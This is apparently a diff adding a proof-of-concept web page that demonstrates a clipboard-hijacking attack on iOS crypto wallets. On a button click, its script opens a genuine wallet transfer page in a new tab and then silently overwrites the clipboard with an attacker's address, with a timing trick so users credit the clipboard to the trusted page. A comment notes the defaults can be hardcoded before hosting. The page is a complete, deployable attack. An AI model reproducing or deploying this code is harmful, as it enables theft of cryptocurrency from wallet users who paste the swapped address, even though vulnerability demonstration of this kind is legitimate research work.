@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>PoC — MetaMask iOS Clipboard Hijacking + Origin Confusion</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    :root { color-scheme: light dark; }
+    body { font-family: system-ui, Arial, sans-serif; padding: 20px; max-width: 760px; margin: auto; }
+    h1 { margin-bottom: 8px; }
+    .desc { opacity: .9; margin-bottom: 16px; }
+    label { display:block; margin-top: 14px; font-weight: 600; }
+    input, button { font-size: 16px; }
+    input[type="text"], input[type="url"] { width: 100%; padding: 10px; box-sizing: border-box; margin-top: 6px; }
+    button { padding: 10px 16px; cursor: pointer; margin-top: 16px; }
+    #status { margin-top: 10px; opacity: .95; }
+    pre { background: #f6f8fa; padding: 12px; border-radius: 8px; overflow: auto; }
+    .muted { opacity: .75; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <h1>PoC — Clipboard Swap + Open Wallet Transaction Page</h1>
+  <p class="desc">
+    On click: opens a <b>trusted wallet transaction page</b> in a new tab, then overwrites the clipboard with an attacker address.
+    The timing creates <i>origin confusion</i> (user thinks clipboard came from the trusted page).
+  </p>
+
+  <label>Trusted wallet transaction URL</label>
+  <input id="trustedUrl" type="url" value="https://app.zerion.io/transfer" />
+
+  <label>Attacker address to write</label>
+  <input id="addrInput" type="text" value="0xA11ceBEEF0000000000000000000000000000000" />
+
+  <button id="trigger">Open Wallet Tx Page & Set Clipboard</button>
+  <div id="status">Idle</div>
+
+  <h3>Log</h3>
+  <pre id="log"></pre>
+
+  <p class="muted">Notes: Requires HTTPS or localhost. First clipboard write in iOS may show one-time permission prompt per app/webview.</p>
+
+  <script>
+    // ===== Configurable defaults (can be hardcoded before hosting) =====
+    const TRUSTED_TX_URL_DEFAULT = 'https://app.zerion.io/transfer';
+    const ATTACKER_ADDRESS_DEFAULT = '0xA11ceBEEF0000000000000000000000000000000';
+
+    const statusEl = document.getElementById('status');
+    const logEl = document.getElementById('log');
+    const btn = document.getElementById('trigger');
+
+    function log(msg) {
+      const line = (typeof msg === 'string') ? msg : JSON.stringify(msg, null, 2);
+      logEl.textContent += line + '\n';
+    }
+
+    async function writeClipboardModern(text) {
+      await navigator.clipboard.writeText(text);
+    }
+
+    // Fallback untuk beberapa webview: execCommand('copy')
+    function writeClipboardFallback(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.setAttribute('readonly', '');
+      ta.style.position = 'fixed';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      const ok = document.execCommand('copy');
+      document.body.removeChild(ta);
+      if (!ok) throw new Error('document.execCommand copy failed');
+    }
+
+    async function setClipboard(text) {
+      // Modern path
+      if (navigator.clipboard && window.isSecureContext) {
+        await writeClipboardModern(text);
+        return 'Async Clipboard API success';
+      }
+      // Fallback path
+      writeClipboardFallback(text);
+      return 'Fallback copy success';
+    }
+
+    async function runPoC() {
+      const trustedUrl = (document.getElementById('trustedUrl').value || TRUSTED_TX_URL_DEFAULT).trim();
+      const attackerAddr = (document.getElementById('addrInput').value || ATTACKER_ADDRESS_DEFAULT).trim();
+
+      // 1) Buka halaman transaksi tepercaya di tab baru (membangun persepsi)
+      statusEl.textContent = 'Opening wallet transaction page...';
+      window.open(trustedUrl, '_blank', 'noopener,noreferrer');
+
+      // 2) Segera setelah itu, timpa clipboard (masih dalam user activation window)
+      statusEl.textContent = 'Attempting clipboard write...';
+      try {
+        // Delay kecil untuk memperkuat persepsi bahwa perubahan berasal dari tab tepercaya
+        await new Promise(r => setTimeout(r, 120));
+        const result = await setClipboard(attackerAddr);
+        statusEl.textContent = 'Clipboard overwritten.';
+        log({ result, written: attackerAddr, opened: trustedUrl, ts: new Date().toISOString() });
+      } catch (err) {
+        statusEl.textContent = 'Clipboard write failed.';
+        log(err && err.message ? err.message : String(err));
+      }
+    }
+
+    btn.addEventListener('click', runPoC);
+  </script>
+</body>
+</html>
